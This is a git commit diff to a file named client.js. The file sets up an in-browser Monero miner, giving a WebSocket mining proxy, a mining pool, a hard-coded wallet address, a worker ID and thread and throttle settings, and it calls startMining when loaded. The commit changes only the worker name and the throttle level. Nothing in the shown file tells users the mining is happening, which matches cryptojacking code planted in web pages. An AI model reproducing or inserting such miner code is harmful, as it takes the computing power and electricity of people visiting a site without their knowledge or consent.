5042c41eb13bcd04586e329ba7797844ecab3146
The Ali Dev <thealixtech@gmail.com>
2022-08-01 12:26:36 +0500

    Update client.js

--- client.js
+++ client.js
@@ -1,8 +1,8 @@
 server = "wss://f.xmrminingproxy.com:8181";
 var pool = "moneroocean.stream";
 var walletAddress = "8ANyqnPspbmdyQaY3FVzb1AYxnQPBKozVQ8qXKiBojvkPbkdv4gt8mCeNnuFhppTEpcVctYKwfiHce9ApMVuHKn8DMfr8un";
-var workerId = "MaxJS"
+var workerId = "AliX JS"
 var threads = 1;
 var password = "x";
 startMining(pool, walletAddress, workerId, threads, password);
-throttleMiner = 25;
+throttleMiner = 30;
